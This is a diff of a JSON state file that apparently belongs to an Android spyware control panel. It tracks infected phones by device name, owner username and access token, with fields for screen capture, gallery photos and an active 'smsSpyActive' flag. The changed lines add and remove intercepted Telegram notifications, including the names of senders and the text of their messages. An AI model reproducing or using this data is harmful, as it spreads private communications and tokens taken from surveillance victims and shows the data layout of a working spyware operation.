@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777356107,
+    "lastSeen": 1776777362120,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777355700,
+    "lastSeen": 1776777361844,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16798 pesan baru dari 118 obrolan",
+        "time": "21/04 20:16",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777363545
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14394,14 +14402,6 @@
         "time": "21/04 19:41",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776775281585
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB CPANEL BY PRABOWO: ⏤͟͟𝐀𝐅 || Jmbt Panjang",
-        "content": "Ini kayn ga on2 vps dh ad",
-        "time": "21/04 19:41",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776775281530
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777355902,
+    "lastSeen": 1776777361968,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
